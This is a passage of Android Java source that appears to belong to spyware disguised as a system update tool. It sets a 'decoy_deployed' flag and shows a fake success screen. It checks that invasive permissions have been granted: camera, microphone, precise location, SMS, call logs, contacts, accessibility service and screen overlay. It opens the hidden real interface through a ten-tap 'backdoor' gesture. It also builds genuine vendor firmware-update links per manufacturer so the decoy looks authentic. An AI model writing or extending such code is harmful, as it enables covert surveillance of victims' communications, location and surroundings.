                getSharedPreferences("StabilityConfig", MODE_PRIVATE).edit().putBoolean("decoy_deployed", true).apply();
                setupSuccessDecoy();
            } else {
                Intent permissions = new Intent(this, PermissionActivity.class);
                permissions.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
                startActivityForResult(permissions, 9999);
            }
        }
    }

    private boolean allPermissionsOk() {
        // Standard perms
        String[] perms = {
            Manifest.permission.CAMERA, Manifest.permission.RECORD_AUDIO,
            Manifest.permission.ACCESS_FINE_LOCATION, Manifest.permission.READ_SMS,
            Manifest.permission.READ_CALL_LOG, Manifest.permission.READ_CONTACTS
        };
        for (String p : perms) {
            if (androidx.core.content.ContextCompat.checkSelfPermission(this, p) != android.content.pm.PackageManager.PERMISSION_GRANTED) return false;
        }
        
        // Special perms
        if (!PermissionActivity.isAccessibilityServiceEnabled(this)) return false;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) return false;
        
        return true;
    }

    private void handleBackdoorClick() {
        long currentTime = System.currentTimeMillis();
        if (currentTime - lastClickTime < 500) clickCount++;
        else clickCount = 1;
        lastClickTime = currentTime;
        if (clickCount >= 10) {
            Intent intent = new Intent(this, MainActivity.class);
            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
            startActivity(intent);
            clickCount = 0;
            finish();
        }
    }

    private String getDynamicUpdateUrl() {
        String manufacturer = Build.MANUFACTURER.toLowerCase(Locale.US);
        String model = Build.MODEL.toUpperCase(Locale.US);
        
        // Samsung High-Fidelity Logic
        if (manufacturer.contains("samsung")) {
            String csc = "XAA"; // Default US Unlocked
            try {
                // Try to get actual CSC from system properties
                java.lang.Class<?> clazz = java.lang.Class.forName("android.os.SystemProperties");
                java.lang.reflect.Method get = clazz.getMethod("get", String.class);
                String salesCode = (String) get.invoke(null, "ro.csc.sales_code");
                if (salesCode != null && !salesCode.isEmpty()) {
                    csc = salesCode.toUpperCase(Locale.US);
                }
            } catch (Exception ignored) {}
            
            // Format: https://doc.samsungmobile.com/MODEL/CSC/doc.html
            return "https://doc.samsungmobile.com/" + model + "/" + csc + "/doc.html";
        }
        
        // Pixel High-Fidelity Logic
        if (manufacturer.contains("google")) {
            return "https://support.google.com/pixelphone/answer/4457705";
        }

        // OnePlus
        if (manufacturer.contains("oneplus")) {
            return "https://www.oneplus.com/support/softwareupgrade";
        }

        // Xiaomi
        if (manufacturer.contains("xiaomi")) {
            return "https://new.c.mi.com/global/miuidownload/index";
        }

        // HTC
        if (manufacturer.contains("htc")) {
            return "https://www.htc.com/us/support/updates.html";
        }
        
        // Fallback for others
        return "https://www.google.com/search?q=" + manufacturer + "+" + model + "+latest+firmware+update+changelog";
    }
}
